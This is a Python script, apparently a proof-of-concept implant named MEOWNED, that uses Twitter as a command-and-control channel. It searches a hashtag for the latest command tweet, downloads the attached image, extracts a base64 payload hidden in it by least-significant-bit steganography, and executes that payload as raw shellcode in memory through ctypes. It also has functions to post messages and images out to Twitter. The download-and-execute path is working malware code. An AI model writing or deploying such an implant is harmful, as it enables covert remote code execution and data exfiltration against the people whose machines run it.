#!/usr/bin/env python3
"""MEOWNED (MEssages Over tWitter Exfiltrating Data)"""
"""pip3 install python-twitter"""
"""pip3 install Stegano"""
"""pip install pyyaml"""

import sys
import yaml
import twitter
import urllib
import re
from stegano import lsb

import ctypes
import base64

# Import YAML
with open("conf.yaml", 'r') as stream:
    try:
        conf = yaml.load(stream)
    except yaml.YAMLError as exc:
        sys.exit("Error: Couldn't parse configuration file, check if conf.yaml exists.")

# Twitter API handler
api = twitter.Api(consumer_key=conf['twitter']['consumer_key'], 
    consumer_secret=conf['twitter']['consumer_secret'], 
    access_token_key=conf['twitter']['access_token_key'], 
    access_token_secret=conf['twitter']['access_token_secret'])

def tweet_image(src_image, message):
    # Hide the secret message
    secret = lsb.hide("./source-imgs/" + src_image, message)
    secret.save("./output-imgs/" + src_image)

    # Post image to Twitter
    status = api.PostMedia( "meow " + "#" + conf['id'], "./output-imgs/" + src_image)
    print("Tweeting image: ")
    print(status.text)

def tweet_message(message):
    # Post message to Twitter
    status = api.PostUpdate( message + " #" + victim_hash)
    print("Tweeting message: ")
    print(status.text)

def verify_api():
    # Verify API credentials with twitter
    try:
        api.VerifyCredentials()
        print("Twitter credentials are valid.")
    except twitter.error.TwitterError as exc:
        sys.exit("Error: Couldn't authenticate with Twitter.")

def get_secret(image):
    # reveal hidden message in the image
    clear_message = lsb.reveal("./download/" + image)
    return clear_message

def search_hashtag(cc_hastag):
    return api.GetSearch(term = cc_hastag)

def run_shellcode(shellcode_base64):
    # decode the shellcode from base64 
    shellcode = base64.b64decode(shellcode_base64)

    # create a buffer in memory
    shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

    # create a function pointer to our shellcode
    shellcode_func   = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

    # call our shellcode
    shellcode_func()

def get_last_cmd():
    # Get the last command from C&C Center
    tweets = search_hashtag("#" + conf['id'])

    print("Retrieving new commands...")

    if(len(tweets) > 0):
        return tweets[0]
    else:
        print("Nothing new.")

def process_tweet(tweet):
    # Process tweet

    if(len(tweet.media) > 0):
        print("Downloading tweet image...")
        urllib.request.urlretrieve(tweet.media[0].media_url_https, "./download/cmd.png")
        print("Downloaded.")
        print("Decrypting hidden message...")
        payload = get_secret("cmd.png")
        run_shellcode(payload)
def extract_urls():
    return re.search("(?P<url>https?://[^\s]+)", myString).group("url")

def main(argv):
    # Main 
    
    # Verify API Credentials
    verify_api()

    # Get last C&C tweet
    cmd_tweet = get_last_cmd()

    if(cmd_tweet):
        process_tweet(cmd_tweet)

if __name__ == "__main__":
    main(sys.argv)